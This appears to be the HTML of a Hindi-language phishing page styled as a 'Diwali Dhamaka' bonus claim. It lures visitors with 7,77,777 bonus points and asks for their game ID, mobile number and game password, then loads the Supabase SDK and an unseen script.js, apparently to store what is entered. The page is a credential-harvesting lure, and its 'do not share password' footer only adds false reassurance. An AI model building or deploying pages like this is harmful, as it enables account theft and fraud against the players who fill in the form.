<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>दिवाली धमाका - बोनस क्लेम</title>
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Devanagari:wght@400;600;700;900&family=Poppins:wght@700&display=swap" rel="stylesheet">
    <!-- CSS फाइल लिंक -->
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <!-- बैकग्राउंड ओवरले -->
    <div class="bg-overlay"></div>

    <main class="container">
        <!-- हेडर सेक्शन -->
        <header class="hero-section">
            <div class="badge">✨ दिवाली स्पेशल ✨</div>
            <h1 class="main-title">दिवाली धमाका</h1>
            
            <div class="number-container">
                <span class="num-box">7</span>
                <span class="num-box">7</span>
                <span class="num-box">7</span>
                <span class="num-box">7</span>
                <span class="num-box">7</span>
                <span class="num-box">7</span>
            </div>

            <h2 class="bonus-text">7,77,777 बोनस पॉइंट्स</h2>
            <p class="sub-text">खुशियों के त्योहार पर खास ऑफर</p>
        </header>

        <!-- फॉर्म कार्ड -->
        <section class="form-card">
            <div class="form-title">
                <span>🌿</span> बोनस क्लेम फॉर्म <span>🌿</span>
            </div>

            <form id="claimForm">
                <div class="input-group">
                    <label for="gameId">गेम आईडी</label>
                    <input type="text" id="gameId" placeholder="अपनी गेम आईडी डालें" required autocomplete="off">
                </div>

                <div class="input-group">
                    <label for="mobileNumber">मोबाइल नंबर</label>
                    <input type="tel" id="mobileNumber" placeholder="10 अंकों का मोबाइल नंबर" pattern="[0-9]{10}" title="कृपया 10 अंकों का मोबाइल नंबर दर्ज करें" required autocomplete="off">
                </div>

                <div class="input-group">
                    <label for="gamePassword">गेम पासवर्ड</label>
                    <input type="password" id="gamePassword" placeholder="गेम पासवर्ड डालें" required>
                </div>

                <label class="checkbox-container">
                    <input type="checkbox" id="terms" required>
                    <span class="checkmark"></span>
                    <span class="terms-text">मैं ऑफर की शर्तों से सहमत हूँ</span>
                </label>

                <button type="submit" class="submit-btn" id="submitBtn">
                    <span class="btn-text">बोनस सबमिट करें</span>
                    <span class="loader hidden"></span>
                </button>
            </form>

            <p class="disclaimer">पात्रता जाँच के बाद बोनस लागू होगा।</p>
        </section>

        <!-- फुटर -->
        <footer>
            <div class="footer-warning">~ पासवर्ड या OTP साझा न करें। ~</div>
            <p class="footer-credit">डिजाइन प्रीव्यू</p>
        </footer>
    </main>

    <!-- टोस्ट नोटिफिकेशन -->
    <div id="toast" class="toast"></div>

    <!-- Supabase SDK और JS फाइल -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="script.js"></script>
</body>
</html>
